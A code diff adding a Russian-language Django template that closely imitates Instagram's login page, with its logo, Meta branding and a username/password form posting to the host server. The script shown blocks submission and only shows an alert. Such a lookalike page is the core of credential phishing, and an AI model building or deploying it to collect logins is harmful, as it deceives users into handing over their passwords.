@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Вход — Instagram</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Segoe UI", sans-serif;
+    }
+
+    body {
+  background-color: #1c2a33;
+  color: #fff;
+  display: flex;
+  align-items: center;      /* вертикальное центрирование */
+  justify-content: center;  /* горизонтальное центрирование */
+  height: 100vh;            /* 100% высоты окна */
+  margin: 0;
+}
+
+.container {
+  width: 320px;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;  /* центрирование login-box по вертикали */
+  align-items: center;      /* центрирование по горизонтали */
+  height: 100vh;            /* контейнер занимает всю высоту окна */
+  position: relative;       /* чтобы meta оставалось снизу */
+}
+
+
+    /* ✅ "Meta" внизу страницы */
+.meta {
+  color: #666;
+  font-size: 14px;
+  align-self: center; /* по центру горизонтали */
+  margin-top: 20px;   /* смещает немного вниз */
+}
+
+
+.login-box {
+  background-color: #1c2a33;
+  padding: 20px 15px; /* меньше пространства внутри */
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .logo {
+      width: 60px;
+      margin-bottom: 100px;
+    }
+
+    /* ✅ "Русский" внутри блока с фоном */
+    .lang {
+      color: #aaa;
+      font-size: 14px;
+      margin-bottom: 45px;
+    }
+
+input {
+  width: 100%;
+  background-color: #1c2a33; /* фон поля */
+  border: 1px solid #444;
+  border-radius: 6px;
+  padding: 12px;
+  margin-bottom: 12px;
+  color: white;             /* цвет текста, который вводим */
+  font-size: 14px;
+  outline: none;
+}
+
+input::placeholder {
+  color: #7c8a95           /* цвет текста placeholder */
+  opacity: 1;               /* чтобы цвет был точно таким, а не бледным */
+}
+
+    button {
+      width: 100%;
+      border: none;
+      border-radius: 8px;
+      padding: 12px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+#login-btn {
+  background-color: #0064e0;
+  color: white;
+  font-weight: bold;
+  font-size: 15px;
+  border-radius: 48px; /* скругление углов */
+  padding: 8px 16px;   /* чтобы кнопка была удобной для клика */
+  border: none;        /* убираем стандартную границу */
+  cursor: pointer;     /* меняем курсор при наведении */
+  transition: background-color 0.3s; /* плавное изменение цвета при ховере */
+}
+
+#login-btn:hover {
+  background-color: #0084d1;
+}
+
+    .forgot {
+      display: block;
+      margin-top: 27px;
+      color: #0095f6;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .forgot:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      border-top: 1px solid #333;
+      margin: 25px 0;
+      width: 100%;
+    }
+
+    .create-account {
+          margin-top: 117px;
+
+      background: transparent;
+      color: #0095f6;
+        border-radius: 48px; /* скругление углов */
+
+      border: 1px solid #0095f6;
+      font-weight: bold;
+    }
+
+    .create-account:hover {
+      background-color: #0095f6;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <p class="lang">Русский</p>
+
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
+
+      {% if messages %}
+        <ul>
+          {% for message in messages %}
+            <li{% if message.tags %} class="{{ message.tags }}"{% endif %}>{{ message }}</li>
+          {% endfor %}
+        </ul>
+      {% endif %}
+
+      <form method="post">
+        {% csrf_token %}
+        <input type="text" id="username" name="username" placeholder="Имя пользователя, эл. адрес или мобильный номер" required>
+        <input type="password" id="password" name="password" placeholder="Пароль" required>
+
+        <button id="login-btn" type="submit">Войти</button>
+      </form>
+
+
+      <a href="#" class="forgot">Забыли пароль?</a>
+
+
+      <button class="create-account">Создать новый аккаунт</button>
+                <p class="meta">Ⓜ Meta</p>
+
+    </div>
+
+  </div>
+
+  <script>
+    document.getElementById("login-btn").addEventListener("click", function(event) {
+      event.preventDefault();
+      const user = document.getElementById("username").value.trim();
+      const pass = document.getElementById("password").value.trim();
+
+      if (user === "" || pass === "") {
+        alert("Пожалуйста, заполните все поля!");
+      } else {
+        alert(`Добро пожаловать, ${user}!`);
+      }
+    });
+  </script>
+</body>
+</html>
